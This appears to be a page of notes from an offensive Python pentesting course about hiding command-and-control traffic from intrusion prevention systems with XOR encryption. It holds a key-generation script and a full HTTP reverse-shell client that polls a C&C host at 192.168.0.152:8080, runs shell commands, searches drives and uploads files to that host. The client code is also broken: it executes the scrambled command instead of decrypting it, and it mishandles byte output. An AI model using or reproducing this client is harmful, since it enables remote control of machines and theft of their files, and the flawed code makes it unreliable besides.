---
title: Bypassing IPS with handmade XOR Encryption
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - ips
  - xor encryption
---

# Bypassing IPS with handmade XOR Encryption

From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).


The idea is to encrypt our traffic to avoid network analyzers or intrusion prevention sensors. SSL or SSH is not recommended here since Next Generation Firewalls have the ability to decrypt them and pass it as plain text to the IPS, where it will be recognized.

- Create a secret key of 1Kb that matches the size of the socket, to make a XOR operation to encrypt the message


```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


# The random and string libraries are used to generate a random string with flexible criteria
import string
import random


# Random Key Generator
key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(0, 1024))


print(key)

print ("\n" + "Key length = " + str(len(key)))

message = 'ipconfig'
print("Msg: " + message + '\n')


# here i defined a dedicated function called str_xor, we will pass two values to this fucntion, the first value is the message(s1) that we want to encrypt or decrypt, and the second paramter is the xor key(s2). We were able to bind the encryption and the decryption phases in one function because the xor operation is exactly the same when we encrypt or decrpyt, the only difference is that when we encrypt we pass the message in clear text and when we want to decrypt we pass the encrypted message


def str_xor(s1, s2):
    return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1,s2)])


# first we split the message and the xor key to a list of character pair in tuples format >>  for (c1,c2) in zip(s1,s2)

# next we will go through each tuple, and converting them to integer using (ord) function, once they converted into integers we can now perform exclusive OR on them  >>  ord(c1) ^ ord(c2)

# then convert the result back to ASCII using (chr) function  >>  chr(ord(c1) ^ ord(c2))
# last step we will merge the resulting array of characters as a sequqnece string using >>>  "".join function 

enc = str_xor(message, key)

print("Encrypted message is " + "\n" + enc + "\n")

dec = str_xor(enc, key)
print("Decrypted message is " + "\n" + dec + "\n")

```



To integrate XOR encryption into [this client side Python script](coding-a-reverse-shell-that-searches-files.md), you can modify the script to encrypt and decrypt the communication between the client and the server using the XOR encryption algorithm.

Here is an example of how to modify the script to incorporate XOR encryption:

```python
import string
import random
import requests
import os
import subprocess
import time

# Random Key Generator
key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&/()=?{[]}+~#-_.:,;<>|\\') for _ in range(0, 1024))

# Define XOR function
def str_xor(s1, s2):
    return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1,s2)])

while True:
    # Send GET request to C&C server to get command
    req = requests.get('http://192.168.0.152:8080')
    command = req.text
    
    # If command is to terminate, break out of loop
    if 'terminate' in command:
        break
    
    # If command is to grab a file and send it to the C&C server
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.0.152:8080/store"
            filer = {'file': open(path, 'rb')}
            r = requests.post(url, files=filer)
        else:
            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())
    
    # If command is to search for files with a specific extension
    elif 'search' in command:
        # Split command into path and file extension
        command = command[7:] #cut off the the first 7 character ,, output would be  C:\\*.pdf
        path, ext = command.split('*')
        lists = '' # here we define a string where we will append our result on it
        
        # Walk through directories and search for files with specified extension
        for dirpath, dirname, files in os.walk(path):
            for file in files:
                if file.endswith(ext):
                    lists = lists + '\n' + os.path.join(dirpath, file)
        requests.post(url='http://192.168.0.152:8080', data=lists)
    
    # If command is a shell command, execute it and send output to the C&C server
    else:
        # Encrypt command with XOR key
        enc = str_xor(command, key)
        
        # Execute encrypted command and capture stdout and stderr
        CMD = subprocess.Popen(enc, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.152:8080', data=str_xor(CMD.stdout.read(), key))
        post_response = requests.post(url='http://192.168.0.152:8080', data=str_xor(CMD.stderr.read(), key))
    
    time.sleep(3)

```